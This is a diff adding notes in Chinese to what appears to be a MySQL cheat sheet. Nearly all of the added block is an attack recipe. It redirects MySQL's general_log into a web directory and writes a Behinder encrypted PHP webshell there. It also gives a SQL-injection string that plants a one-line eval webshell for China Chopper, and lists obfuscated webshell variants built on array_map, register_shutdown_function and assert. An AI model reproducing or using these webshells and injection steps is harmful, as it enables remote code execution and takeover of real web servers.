@@ -403,6 +403,66 @@ FLUSH   PRIVILEGES;
 grant all privileges on 库名.表名 to '用户名'@'IP地址' identified by '密码' with grant option;
 flush privileges;
 ```
+
+```
+ show variables like '%general%';
+ #查看mysql中是否可以更改日志文件位置，和查看当前日志在服务器中的“绝对路径”从而判断web目录。
+ 
+ set global general_log = on;
+ #设置全局变量为on，然后才可以写入更改文件
+
+set global general_log_file = "C:/test/webroot/log.php";
+ #设置日志文件到web服务下的目录，等通过sql语句写完shell后好执行！
+
+select '<?php
+@error_reporting(0);
+session_start();
+    $key="e45e329feb5d925b"; 
+	$_SESSION["k"]=$key;
+	$post=file_get_contents("php://input");
+	if(!extension_loaded("openssl"))
+	{
+		$t="base64_"."decode";
+		$post=$t($post."");
+		
+		for($i=0;$i<strlen($post);$i++) {
+    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
+    			}
+	}
+	else
+	{
+		$post=openssl_decrypt($post, "AES128", $key);
+	}
+    $arr=explode("|",$post);
+    $func=$arr[0];
+    $params=$arr[1];
+	class C{public function __invoke($p) {eval($p."");}}
+    @call_user_func(new C(),$params);
+?>
+';
+
+#将mysql的general_log变量值为ON后，生成log文件后，直接输入以上冰蝎代码。
+
+admin' or (select '<?php @eval($_POST[cmd]);?>') and 'a'='a
+
+#  经过验证，如果知道路径生成日志文件后，通过sql注入执行select一句话木马就可以直接连接菜刀，然后通过菜刀上传冰蝎马扩大权限！
+
+
+<?php $e = $_REQUEST["e"];$arr = array($_POST["POST"],);array_map(base64_decode($e), $arr);?>
+
+<?$e = $_REQUEST["e"]; register_shutdown_function($e, $_POST["hai"]); ?>
+
+/*
+	$e($_REQUEST[hai])   最后$e=eval 或者是$e=assert  ，assert($_REQUEST[hai]);
+	注：传参的值后面不要加（），如?e=assert 就可以了
+*/
+```
+
+
+
+
+
+
 -返回2013错误设置timeout变量值
 ```
 set GLOBAL interactive_timeout=2880000;
